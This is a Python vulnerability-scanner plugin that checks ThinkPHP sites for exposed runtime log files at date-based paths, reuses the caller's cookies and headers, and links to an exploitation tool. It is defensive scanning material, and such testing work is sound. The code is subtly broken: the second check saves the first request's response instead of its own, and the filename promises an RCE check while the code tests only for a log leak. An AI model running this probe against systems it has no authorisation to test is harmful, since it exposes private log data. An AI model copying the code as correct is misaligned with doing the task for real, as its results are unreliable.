#!/usr/bin/env python3
# @Time    : 2020-06-13
# @Author  : caicai
# @File    : poc_thinkphp_rce_all_2020.py

from myscan.lib.parse.dictdata_parser import dictdata_parser  # 写了一些操作dictdata的方法的类
from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.lib.core.common import get_random_str, get_random_num
from myscan.config import scan_set
import datetime


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "thinkphp log file leak"
        self.vulmsg = "thinkphp log file leak"
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        timestring = datetime.datetime.now().strftime('%Y_%m_%d')
        filename = "Application/Runtime/Logs/Home/" + timestring[2:] + ".log"
        filename1 = "Runtime/Logs/Home/" + timestring[2:] + ".log"
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > 3:
            return
        req = {
            "method": "GET",
            "url": self.url + filename,
            "headers": self.dictdata.get("request").get("headers"),  # 主要保留cookie等headers
            "timeout": 10,
            "verify": False,
            "allow_redirects": False
        }
        r = request(**req)
        if r is not None and r.status_code == 200:
            self.save(r,
                      "thinkphp日志文件泄漏" + self.url + filename,
                      "利用工具:{}".format("https://github.com/whirlwind110/tphack")
                      )
            return

        req1 = {
            "method": "GET",
            "url": self.url + filename1,
            "headers": self.dictdata.get("request").get("headers"),  # 主要保留cookie等headers
            "timeout": 10,
            "verify": False,
            "allow_redirects": False
        }
        r1 = request(**req1)
        if r1 is not None and r1.status_code == 200:
            self.save(r,
                      "thinkphp日志文件泄漏" + self.url + filename1,
                      "利用工具:{}".format("https://github.com/whirlwind110/tphack")
                      )

    def save(self, r, others, vulmsg):
        parser_ = response_parser(r)
        self.result.append({
            "name": self.name,
            "url": parser_.geturl(),
            "level": 2,  # 0:Low  1:Medium 2:High
            "detail": {
                "others": others,
                "vulmsg": vulmsg,
                "request": parser_.getrequestraw(),
                "response": parser_.getresponseraw()
            }
        })
